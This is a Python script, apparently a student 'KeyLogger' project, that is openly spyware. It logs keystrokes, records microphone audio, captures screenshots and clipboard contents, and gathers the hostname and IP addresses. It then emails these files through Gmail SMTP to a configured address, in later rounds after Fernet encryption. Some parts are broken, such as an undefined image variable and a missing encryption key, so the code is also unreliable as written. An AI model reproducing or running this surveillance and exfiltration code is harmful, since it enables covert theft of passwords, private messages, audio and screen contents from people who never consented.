import os
import socket
import platform
import smtplib
import time
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email import encoders
from requests import get
from pynput import keyboard
from pynput.keyboard import Key, Listener
from cryptography.fernet import Fernet
from scipy.io.wavfile import write
import win32clipboard
import sounddevice as sd
from PIL import ImageGrab
# File paths and email configuration
keys_info = "key_log.txt"
system_info = 'sys_info.txt'
clipboard_info = 'clipboard.txt'
file_path = "//Users//lydiacharif//KeyLogger//project"
extend = "//"
email_address = "your_email@gmail.com"
password = "your_email_password"
toaddr = "same_email@gmail.com"
clipboard_info = 'clipboard.txt'
mic_time = 21
audio_info = 'audio.wav'
screenshot_info = 'screenshot.png'
time_iteration = 25
number_iteration_end = 2
keys_info_e ='e_key_log.txt'
system_info_e = 'e_systeminfo.txt'
clipboard_info_e ='e_clipboard.txt'
file_merge = file_path + extend
#######################################################################################################
# Function to send email
def send_email(filename, attachment, toaddr):
    fromaddr = email_address
    message = MIMEMultipart()
    message['From'] = fromaddr
    message['To'] = toaddr
    message['Subject'] = 'Log File'
    body = 'Body of the email'
    message.attach(MIMEText(body, 'plain'))

    attachment = open(attachment, 'rb')
    p = MIMEBase('application', 'octet-stream')
    p.set_payload(attachment.read())
    encoders.encode_base64(p)
    p.add_header('Content-Disposition', f'attachment; filename={filename}')
    message.attach(p)

    s = smtplib.SMTP('smtp.gmail.com', 587)
    s.starttls()
    s.login(fromaddr, password)
    s.sendmail(fromaddr, toaddr, message.as_string())
    s.quit()

send_email(keys_info, file_path + extend + keys_info, toaddr)
####################################################################################################################
# Function to collect computer information
def computer_info():
    with open(file_path + extend + system_info, "a") as f:
        hostname = socket.gethostname()
        ip_address = socket.gethostbyname(hostname)
        try:
            public_ip = get("https://api.ipify.org").text
            f.write("Public IP: " + public_ip + '\n')
        except Exception:
            f.write("Couldn't get public IP\n")
        f.write("Processor: " + platform.processor() + '\n')
        f.write("System: " + platform.system() + " " + platform.version() + '\n')
        f.write("Machine: " + platform.machine() + '\n')
        f.write("Hostname: " + hostname + '\n')
        f.write("Private IP: " + ip_address + '\n')

computer_info()

def copy_clipborad():
    with open(file_path + extend + clipboard_info,'a') as f :
        try:
            win32clipboard.OpenClipboard()
            pasted_data = win32clipboard.GetClipboardData()
            win32clipboard.CloseClipboard()
            f.write('Clipboard Data: \n'+ pasted_data)
        except:
            f.write('we cant copy it unf')

copy_clipborad()

def mic():
    fs = 44100
    seconds = mic_time
    record = sd.rec(int(seconds * fs), samplerate = fs, channels = 2)
    sd.wait()
    write(file_path +extend +audio_info, fs, record)

mic()

def screenshot():
    image = ImageGrab.grab()
    im.save(file_path + extend + screenshot_info)

screenshot()

number_iteration = 0
currentTime = time.time()
stopingTime = time.time() + time_iteration

while number_iteration < number_iteration_end :

    count = 0
    keys = []

    def on_press(key):
        global keys, count, currentTime
        print(key)
        keys.append(key)
        count += 1
        currentTime = time.time()

        if count >= 1:
            count = 0
            write_file(keys)
            keys = []

    def write_file(keys):
        with open(file_path + extend + keys_info, "a") as f:
            for key in keys:
                k = str(key).replace("'", "")
                if k.find("space") > 0:
                    f.write('\n')
                elif k.find('Key') == -1:
                    f.write(k)

    def on_release(key):
        if key == Key.esc:
            return False
        if currentTime > stopingTime:
            return False
        if currentTime > stopingTime :
            return False

    with Listener(on_press=on_press, on_release=on_release) as listener:
        listener.join()

    if currentTime > stopingTime:
        with open(file_path + extend + keys_info, 'w') as f:
            f.write('')
        screenshot()
        send_email(screenshot_info,file_path + extend + screenshot_info,toaddr)
        copy_clipborad()
        number_iteration +=1
        currentTime = time.time()
        stopingTime = time.time() + time_iteration

               #0 index and so go on
files_to_enc = [file_merge + system_info, file_merge + clipboard_info, file_merge + keys_info]
encryp_file_names =[file_merge + system_info_e, file_merge + clipboard_info_e, file_merge + keys_info_e]

count=0
for ecnrypt_file in files_to_enc :
    with open(files_to_enc[count], 'rb') as f:
        data = f.read()
    fernet = Fernet(key)
    encrypt= fernet.encrypt(data)
    with open(encryp_file_names[count], 'wb') as f :
        f.write(encrypt)
    send_email(encryp_file_names[count], encryp_file_names[count], toaddr)
    count+=1
time.sleep(160)




